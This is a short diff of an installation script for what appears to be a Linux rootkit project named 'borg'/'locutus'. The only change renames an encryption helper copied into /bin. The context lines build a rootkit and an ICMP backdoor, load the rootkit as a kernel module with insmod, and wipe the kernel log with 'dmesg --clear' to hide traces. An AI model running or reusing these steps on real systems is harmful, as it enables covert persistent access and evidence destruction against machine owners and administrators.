@@ -8,8 +8,8 @@ mv locutus borg_locutus # add magic prefix
 cd borg_locutus
 bash make.sh # build rk and icmp backdoor
 sudo mv borg_transwarp /bin/
-sudo mv enc.py /bin/borg_enc.py
-sudo chmod +x /bin/borg_enc.py
+sudo mv enc.py /bin/borg_enc
+sudo chmod +x /bin/borg_enc
 mv locutus.ko borg_locutus.ko
 insmod borg_locutus.ko # insert lkm
 dmesg --clear # clear log
